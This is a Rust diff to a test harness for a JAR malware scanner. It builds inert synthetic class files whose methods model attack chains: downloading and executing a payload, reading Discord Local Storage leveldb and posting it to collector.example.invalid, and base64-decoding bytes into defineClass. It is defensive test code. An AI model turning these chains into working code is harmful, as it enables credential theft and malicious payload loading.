@@ -2,7 +2,9 @@
 //!
 //! The fixtures contain only metadata and deliberately inert class files. The
 //! scanner never loads classes or native files; this binary only writes the
-//! fixture archives into a temporary directory and scans their bytes.
+//! fixture archives into a temporary directory and scans their bytes. A few
+//! fixture methods contain synthetic call sequences so the static data-flow
+//! parser can be regression-tested without executing a JAR.
 
 // This standalone binary imports scanner modules directly until the application
 // exposes a library crate; the API-only model types are intentionally unused.
@@ -266,6 +268,12 @@ fn assert_report(spec: &FixtureSpec, outcome: &ScanOutcome) -> Vec<String> {
         .findings
         .iter()
         .map(|finding| finding.rule_id.as_str())
+        .chain(
+            report
+                .confirmed_chains
+                .iter()
+                .map(|chain| chain.rule_id.as_str()),
+        )
         .collect::<Vec<_>>();
     for required in &spec.required_findings {
         if !finding_ids.contains(&required.as_str()) {
@@ -341,11 +349,7 @@ fn materialize_fixture(destination: &Path, scenario: Scenario) -> anyhow::Result
     write_entry(
         &mut archive,
         &format!("{FIXTURE_CLASS_NAME}.class"),
-        &minimal_class(
-            FIXTURE_CLASS_NAME,
-            &definition.references,
-            &definition.strings,
-        ),
+        &minimal_class(FIXTURE_CLASS_NAME, &definition.methods),
         options,
     )?;
     for (path, bytes) in definition.resources {
@@ -367,27 +371,146 @@ fn write_entry(
 }
 
 struct ScenarioDefinition {
-    references: Vec<&'static str>,
-    strings: Vec<&'static str>,
+    methods: Vec<MethodDefinition>,
     resources: Vec<(&'static str, &'static [u8])>,
 }
+
+#[derive(Clone, Copy)]
+struct MethodReference {
+    owner: &'static str,
+    name: &'static str,
+    descriptor: &'static str,
+}
+
+#[derive(Clone)]
+struct MethodDefinition {
+    name: &'static str,
+    instructions: Vec<FixtureInstruction>,
+}
+
+#[derive(Clone)]
+enum FixtureInstruction {
+    LoadString(&'static str),
+    StoreLocal(u8),
+    LoadLocal(u8),
+    InvokeStatic(MethodReference),
+    InvokeVirtual(MethodReference),
+    Pop,
+    Return,
+}
+
+impl MethodDefinition {
+    fn capability(
+        name: &'static str,
+        reference: MethodReference,
+        value: Option<&'static str>,
+    ) -> Self {
+        let mut instructions = Vec::new();
+        if let Some(value) = value {
+            instructions.push(FixtureInstruction::LoadString(value));
+            instructions.push(FixtureInstruction::StoreLocal(0));
+            instructions.push(FixtureInstruction::LoadLocal(0));
+        }
+        instructions.push(FixtureInstruction::InvokeStatic(reference));
+        if !reference.descriptor.ends_with(")V") {
+            instructions.push(FixtureInstruction::Pop);
+        }
+        instructions.push(FixtureInstruction::Return);
+        Self { name, instructions }
+    }
+}
+
+const FILES_WRITE: MethodReference = MethodReference {
+    owner: "java/nio/file/Files",
+    name: "write",
+    descriptor: "(Ljava/lang/String;[B)V",
+};
+const FILES_READ_ALL_BYTES: MethodReference = MethodReference {
+    owner: "java/nio/file/Files",
+    name: "readAllBytes",
+    descriptor: "(Ljava/lang/String;)[B",
+};
+const HTTP_DOWNLOAD: MethodReference = MethodReference {
+    owner: "java/net/http/HttpClient",
+    name: "send",
+    descriptor: "(Ljava/lang/String;)[B",
+};
+const HTTP_POST: MethodReference = MethodReference {
+    owner: "java/net/http/HttpClient",
+    name: "post",
+    descriptor: "(Ljava/lang/String;[B)V",
+};
+const RUNTIME_EXEC: MethodReference = MethodReference {
+    owner: "java/lang/Runtime",
+    name: "exec",
+    descriptor: "(Ljava/lang/String;)Ljava/lang/Process;",
+};
+const BASE64_GET_DECODER: MethodReference = MethodReference {
+    owner: "java/util/Base64",
+    name: "getDecoder",
+    descriptor: "()Ljava/util/Base64$Decoder;",
+};
+const BASE64_DECODE: MethodReference = MethodReference {
+    owner: "java/util/Base64$Decoder",
+    name: "decode",
+    descriptor: "(Ljava/lang/String;)[B",
+};
+const DEFINE_CLASS: MethodReference = MethodReference {
+    owner: "java/lang/ClassLoader",
+    name: "defineClass",
+    descriptor: "([B)Ljava/lang/Class;",
+};
 
 impl From<Scenario> for ScenarioDefinition {
     fn from(scenario: Scenario) -> Self {
         match scenario {
             Scenario::ConfigWrite => Self {
-                references: vec!["java/nio/file/Files.write"],
-                strings: vec!["config/regressionfixture.json", "{}"],
+                methods: vec![MethodDefinition::capability(
+                    "saveConfig",
+                    MethodReference {
+                        owner: "java/nio/file/Files",
+                        name: "write",
+                        descriptor: "(Ljava/lang/String;)V",
+                    },
+                    Some("config/regressionfixture.json"),
+                )],
                 resources: Vec::new(),
             },
             Scenario::DesktopBrowse => Self {
-                references: vec!["java/awt/Desktop.getDesktop", "java/awt/Desktop.browse"],
-                strings: vec!["https://wiki.example.invalid/regression"],
+                methods: vec![MethodDefinition {
+                    name: "openWiki",
+                    instructions: vec![
+                        FixtureInstruction::LoadString("https://wiki.example.invalid/regression"),
+                        FixtureInstruction::StoreLocal(0),
+                        FixtureInstruction::InvokeStatic(MethodReference {
+                            owner: "java/awt/Desktop",
+                            name: "getDesktop",
+                            descriptor: "()Ljava/awt/Desktop;",
+                        }),
+                        FixtureInstruction::LoadLocal(0),
+                        FixtureInstruction::InvokeVirtual(MethodReference {
+                            owner: "java/awt/Desktop",
+                            name: "browse",
+                            descriptor: "(Ljava/lang/String;)V",
+                        }),
+                        FixtureInstruction::Return,
+                    ],
+                }],
                 resources: Vec::new(),
             },
             Scenario::FatJarDependencies => Self {
-                references: vec!["java/lang/reflect/Method.invoke", "java/util/Base64"],
-                strings: Vec::new(),
+                methods: vec![
+                    MethodDefinition::capability(
+                        "reflect",
+                        MethodReference {
+                            owner: "java/lang/reflect/Method",
+                            name: "invoke",
+                            descriptor: "()V",
+                        },
+                        None,
+                    ),
+                    MethodDefinition::capability("base64", BASE64_GET_DECODER, None),
+                ],
                 resources: vec![
                     ("META-INF/jars/jna-5.14.0.jar", empty_jar_bytes()),
                     ("META-INF/jars/zip4j-2.11.5.jar", empty_jar_bytes()),
@@ -395,48 +518,121 @@ impl From<Scenario> for ScenarioDefinition {
                 ],
             },
             Scenario::DiscordRpc => Self {
-                references: vec!["java/lang/System.loadLibrary", "java/lang/ProcessBuilder"],
-                strings: vec!["discord-rpc", "media player integration"],
+                methods: vec![
+                    MethodDefinition::capability(
+                        "loadDiscordRpc",
+                        MethodReference {
+                            owner: "java/lang/System",
+                            name: "loadLibrary",
+                            descriptor: "(Ljava/lang/String;)V",
+                        },
+                        Some("discord-rpc"),
+                    ),
+                    MethodDefinition::capability(
+                        "mediaIntegration",
+                        MethodReference {
+                            owner: "java/lang/ProcessBuilder",
+                            name: "start",
+                            descriptor: "()Ljava/lang/Process;",
+                        },
+                        Some("media player integration"),
+                    ),
+                ],
                 resources: vec![(
                     "mediaplayerinfo/natives/discord-rpc.dll",
                     b"MZsafe-discord-fixture",
                 )],
             },
             Scenario::AutoUpdater => Self {
-                references: vec![
-                    "java/net/http/HttpClient",
-                    "java/nio/file/Files.write",
-                    "java/lang/ProcessBuilder",
-                ],
-                strings: vec!["https://updates.example.invalid/mod.jar", "mod-update.jar"],
+                methods: vec![download_write_execute_method("downloadWriteExecute")],
                 resources: Vec::new(),
             },
             Scenario::ObfuscatedClean => Self {
-                references: vec!["java/util/Base64"],
-                strings: vec!["a", "b", "c", "configuration value"],
+                methods: vec![MethodDefinition {
+                    name: "a",
+                    instructions: vec![
+                        FixtureInstruction::LoadString("configuration value"),
+                        FixtureInstruction::StoreLocal(0),
+                        FixtureInstruction::InvokeStatic(BASE64_GET_DECODER),
+                        FixtureInstruction::Pop,
+                        FixtureInstruction::Return,
+                    ],
+                }],
                 resources: Vec::new(),
             },
             Scenario::ObfuscatedLoader => Self {
-                references: vec![
-                    "java/net/http/HttpClient",
-                    "java/nio/file/Files.write",
-                    "java/lang/Runtime.exec",
+                methods: vec![
+                    download_write_execute_method("a"),
+                    base64_define_class_method(),
                 ],
-                strings: vec!["xor-decoded:https://updates.example.invalid/payload.jar"],
                 resources: Vec::new(),
             },
             Scenario::CredentialStealer => Self {
-                references: vec![
-                    "java/net/http/HttpClient",
-                    "java/nio/file/Files.readAllBytes",
-                ],
-                strings: vec![
-                    "discord/Local Storage/leveldb",
-                    "https://collector.example.invalid/upload",
-                ],
+                methods: vec![credential_exfiltration_method()],
                 resources: Vec::new(),
             },
         }
+    }
+}
+
+fn download_write_execute_method(name: &'static str) -> MethodDefinition {
+    MethodDefinition {
+        name,
+        instructions: vec![
+            FixtureInstruction::LoadString("https://updates.example.invalid/payload.jar"),
+            FixtureInstruction::StoreLocal(0),
+            FixtureInstruction::LoadLocal(0),
+            FixtureInstruction::InvokeStatic(HTTP_DOWNLOAD),
+            FixtureInstruction::StoreLocal(1),
+            FixtureInstruction::LoadString("mod-update.jar"),
+            FixtureInstruction::StoreLocal(2),
+            FixtureInstruction::LoadLocal(2),
+            FixtureInstruction::LoadLocal(1),
+            FixtureInstruction::InvokeStatic(FILES_WRITE),
+            FixtureInstruction::LoadLocal(2),
+            FixtureInstruction::StoreLocal(3),
+            FixtureInstruction::LoadLocal(3),
+            FixtureInstruction::InvokeStatic(RUNTIME_EXEC),
+            FixtureInstruction::Pop,
+            FixtureInstruction::Return,
+        ],
+    }
+}
+
+fn credential_exfiltration_method() -> MethodDefinition {
+    MethodDefinition {
+        name: "readCredentialsAndExfiltrate",
+        instructions: vec![
+            FixtureInstruction::LoadString("discord/Local Storage/leveldb"),
+            FixtureInstruction::StoreLocal(0),
+            FixtureInstruction::LoadLocal(0),
+            FixtureInstruction::InvokeStatic(FILES_READ_ALL_BYTES),
+            FixtureInstruction::StoreLocal(1),
+            FixtureInstruction::LoadString("https://collector.example.invalid/upload"),
+            FixtureInstruction::StoreLocal(2),
+            FixtureInstruction::LoadLocal(2),
+            FixtureInstruction::LoadLocal(1),
+            FixtureInstruction::InvokeStatic(HTTP_POST),
+            FixtureInstruction::Return,
+        ],
+    }
+}
+
+fn base64_define_class_method() -> MethodDefinition {
+    MethodDefinition {
+        name: "decodeAndDefineClass",
+        instructions: vec![
+            FixtureInstruction::LoadString("Zml4dHVyZS1jbGFzcy1ieXRlcw=="),
+            FixtureInstruction::StoreLocal(0),
+            FixtureInstruction::InvokeStatic(BASE64_GET_DECODER),
+            FixtureInstruction::LoadLocal(0),
+            FixtureInstruction::InvokeVirtual(BASE64_DECODE),
+            FixtureInstruction::StoreLocal(1),
+            FixtureInstruction::LoadLocal(1),
+            FixtureInstruction::InvokeStatic(DEFINE_CLASS),
+            FixtureInstruction::Pop,
+            FixtureInstruction::Return,
+        ],
     }
 }
 
@@ -445,31 +641,21 @@ fn empty_jar_bytes() -> &'static [u8] {
     b"PK\x05\x06\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
 }
 
-/// Builds an intentionally minimal class file with symbolic method references.
+/// Builds a class file whose methods are only scanned as immutable bytes.
 ///
-/// The class contains no method bodies, so it cannot execute. The symbolic
-/// references are sufficient for the existing constant-pool scanner and make
-/// the fixture format ready for a later method-level fixture upgrade.
-fn minimal_class(class_name: &str, references: &[&str], strings: &[&str]) -> Vec<u8> {
+/// The generated class has no entry point and `regression-scan` never loads it.
+/// Its methods are deliberately small, linear examples of value propagation for
+/// the bytecode parser and data-flow tests.
+fn minimal_class(class_name: &str, methods: &[MethodDefinition]) -> Vec<u8> {
     let mut pool = ConstantPoolBuilder::default();
     let this_name = pool.utf8(class_name);
     let this_class = pool.class(this_name);
     let object_name = pool.utf8("java/lang/Object");
     let object_class = pool.class(object_name);
-    for value in strings {
-        pool.utf8(value);
-    }
-    for reference in references {
-        let (class_name, method_name) = reference
-            .rsplit_once('.')
-            .unwrap_or((*reference, "fixtureCall"));
-        let owner_name = pool.utf8(class_name);
-        let owner = pool.class(owner_name);
-        let member_name = pool.utf8(method_name);
-        let descriptor = pool.utf8("()V");
-        let name_and_type = pool.name_and_type(member_name, descriptor);
-        pool.method_ref(owner, name_and_type);
-    }
+    let encoded_methods = methods
+        .iter()
+        .map(|method| encode_method(&mut pool, method))
+        .collect::<Vec<_>>();
 
     let mut bytes = Vec::new();
     bytes.extend_from_slice(&0xCAFEBABEu32.to_be_bytes());
@@ -482,9 +668,65 @@ fn minimal_class(class_name: &str, references: &[&str], strings: &[&str]) -> Vec
     bytes.extend_from_slice(&object_class.to_be_bytes());
     bytes.extend_from_slice(&0u16.to_be_bytes());
     bytes.extend_from_slice(&0u16.to_be_bytes());
-    bytes.extend_from_slice(&0u16.to_be_bytes());
+    bytes.extend_from_slice(&(encoded_methods.len() as u16).to_be_bytes());
+    for method in encoded_methods {
+        bytes.extend_from_slice(&method);
+    }
     bytes.extend_from_slice(&0u16.to_be_bytes());
     bytes
+}
+
+fn encode_method(pool: &mut ConstantPoolBuilder, method: &MethodDefinition) -> Vec<u8> {
+    let method_name = pool.utf8(method.name);
+    let descriptor = pool.utf8("()V");
+    let code_name = pool.utf8("Code");
+    let mut code = Vec::new();
+    let mut max_local = 0;
+
+    for instruction in &method.instructions {
+        match instruction {
+            FixtureInstruction::LoadString(value) => {
+                code.push(0x13); // ldc_w
+                code.extend_from_slice(&pool.string(value).to_be_bytes());
+            }
+            FixtureInstruction::StoreLocal(index) => {
+                code.extend_from_slice(&[0x3a, *index]); // astore
+                max_local = max_local.max(*index);
+            }
+            FixtureInstruction::LoadLocal(index) => {
+                code.extend_from_slice(&[0x19, *index]); // aload
+                max_local = max_local.max(*index);
+            }
+            FixtureInstruction::InvokeStatic(reference) => {
+                code.push(0xb8);
+                code.extend_from_slice(&pool.reference(*reference).to_be_bytes());
+            }
+            FixtureInstruction::InvokeVirtual(reference) => {
+                code.push(0xb6);
+                code.extend_from_slice(&pool.reference(*reference).to_be_bytes());
+            }
+            FixtureInstruction::Pop => code.push(0x57),
+            FixtureInstruction::Return => code.push(0xb1),
+        }
+    }
+
+    let mut code_attribute = Vec::new();
+    code_attribute.extend_from_slice(&4u16.to_be_bytes());
+    code_attribute.extend_from_slice(&(u16::from(max_local) + 1).to_be_bytes());
+    code_attribute.extend_from_slice(&(code.len() as u32).to_be_bytes());
+    code_attribute.extend_from_slice(&code);
+    code_attribute.extend_from_slice(&0u16.to_be_bytes()); // exception table
+    code_attribute.extend_from_slice(&0u16.to_be_bytes()); // nested attributes
+
+    let mut encoded = Vec::new();
+    encoded.extend_from_slice(&0x0009u16.to_be_bytes()); // public static
+    encoded.extend_from_slice(&method_name.to_be_bytes());
+    encoded.extend_from_slice(&descriptor.to_be_bytes());
+    encoded.extend_from_slice(&1u16.to_be_bytes());
+    encoded.extend_from_slice(&code_name.to_be_bytes());
+    encoded.extend_from_slice(&(code_attribute.len() as u32).to_be_bytes());
+    encoded.extend_from_slice(&code_attribute);
+    encoded
 }
 
 #[derive(Default)]
@@ -512,6 +754,14 @@ impl ConstantPoolBuilder {
         index
     }
 
+    fn string(&mut self, value: &str) -> u16 {
+        let value_index = self.utf8(value);
+        let index = self.next_index();
+        self.bytes.push(8);
+        self.bytes.extend_from_slice(&value_index.to_be_bytes());
+        index
+    }
+
     fn class(&mut self, name_index: u16) -> u16 {
         let index = self.next_index();
         self.bytes.push(7);
@@ -536,6 +786,15 @@ impl ConstantPoolBuilder {
             .extend_from_slice(&name_and_type_index.to_be_bytes());
         index
     }
+
+    fn reference(&mut self, reference: MethodReference) -> u16 {
+        let owner_name = self.utf8(reference.owner);
+        let owner = self.class(owner_name);
+        let member_name = self.utf8(reference.name);
+        let descriptor = self.utf8(reference.descriptor);
+        let name_and_type = self.name_and_type(member_name, descriptor);
+        self.method_ref(owner, name_and_type)
+    }
 }
 
 #[cfg(test)]
@@ -544,6 +803,8 @@ mod tests {
     use crate::models::scan::{
         Capability, Confidence, Finding, Obfuscation, ObfuscationLevel, ScanReport,
     };
+    use crate::scanner::class_file::{parse_class_file, ClassFileData};
+    use std::io::Read;
     use tempfile::TempDir;
 
     #[test]
@@ -614,5 +875,99 @@ mod tests {
         };
 
         assert!(assert_report(&spec, &outcome).is_empty());
+    }
+
+    #[test]
+    fn chain_fixtures_expose_local_value_flow_and_api_calls() {
+        const AUTO_UPDATER_CALLS: &[(&str, &str)] = &[
+            ("java/net/http/HttpClient", "send"),
+            ("java/nio/file/Files", "write"),
+            ("java/lang/Runtime", "exec"),
+        ];
+        const CREDENTIAL_EXFILTRATION_CALLS: &[(&str, &str)] = &[
+            ("java/nio/file/Files", "readAllBytes"),
+            ("java/net/http/HttpClient", "post"),
+        ];
+        const DYNAMIC_CLASS_LOADING_CALLS: &[(&str, &str)] = &[
+            ("java/util/Base64", "getDecoder"),
+            ("java/util/Base64$Decoder", "decode"),
+            ("java/lang/ClassLoader", "defineClass"),
+        ];
+        let cases = [
+            (
+                Scenario::AutoUpdater,
+                "downloadWriteExecute",
+                AUTO_UPDATER_CALLS,
+            ),
+            (
+                Scenario::CredentialStealer,
+                "readCredentialsAndExfiltrate",
+                CREDENTIAL_EXFILTRATION_CALLS,
+            ),
+            (
+                Scenario::ObfuscatedLoader,
+                "decodeAndDefineClass",
+                DYNAMIC_CLASS_LOADING_CALLS,
+            ),
+        ];
+        let temporary_directory = TempDir::new().expect("temporary directory");
+
+        for (scenario, method_name, expected_calls) in cases {
+            let archive_path = temporary_directory
+                .path()
+                .join(format!("{method_name}.jar"));
+            materialize_fixture(&archive_path, scenario).expect("fixture archive materializes");
+            let class_file = fixture_class_bytes(&archive_path);
+            let parsed = parse_class_file(&class_file).expect("fixture class parses");
+            assert_method_contains_calls(&parsed, method_name, expected_calls);
+        }
+    }
+
+    fn fixture_class_bytes(archive_path: &Path) -> Vec<u8> {
+        let file = fs::File::open(archive_path).expect("fixture archive opens");
+        let mut archive = zip::ZipArchive::new(file).expect("fixture archive is a zip");
+        let mut class = archive
+            .by_name(&format!("{FIXTURE_CLASS_NAME}.class"))
+            .expect("fixture class exists");
+        let mut bytes = Vec::new();
+        class
+            .read_to_end(&mut bytes)
+            .expect("fixture class reads without executing it");
+        bytes
+    }
+
+    fn assert_method_contains_calls(
+        parsed: &ClassFileData,
+        method_name: &str,
+        expected_calls: &[(&str, &str)],
+    ) {
+        let method = parsed
+            .methods
+            .iter()
+            .find(|method| method.method_name == method_name)
+            .unwrap_or_else(|| panic!("missing fixture method {method_name}"));
+        assert!(
+            method
+                .instructions
+                .iter()
+                .any(|instruction| instruction.opcode == 0x3a),
+            "{method_name} must store a value in a local variable"
+        );
+        assert!(
+            method
+                .instructions
+                .iter()
+                .any(|instruction| instruction.opcode == 0x19),
+            "{method_name} must load a value from a local variable"
+        );
+        for (owner, name) in expected_calls {
+            assert!(
+                method
+                    .calls
+                    .iter()
+                    .any(|call| { call.owner.as_deref() == Some(*owner) && call.name == *name }),
+                "{method_name} must call {owner}.{name}"
+            );
+        }
     }
 }
